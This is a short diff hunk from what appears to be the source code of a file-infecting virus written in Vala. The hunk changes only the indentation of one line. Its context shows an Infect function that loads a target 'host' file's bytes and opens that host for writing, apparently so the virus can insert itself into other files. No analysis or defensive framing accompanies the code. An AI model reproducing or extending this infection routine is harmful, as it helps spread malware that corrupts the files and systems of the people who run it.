@@ -102,7 +102,7 @@ int GetSize(string f) {
 void Infect(string f) {
 
 
-    var file = File.new_for_path(f);
+    	var file = File.new_for_path(f);
 	file.load_contents(null, out hostbytes, out etag_outhost); //load host bytes
 
 	FileIOStream ios = file.open_readwrite(); //open host for writting
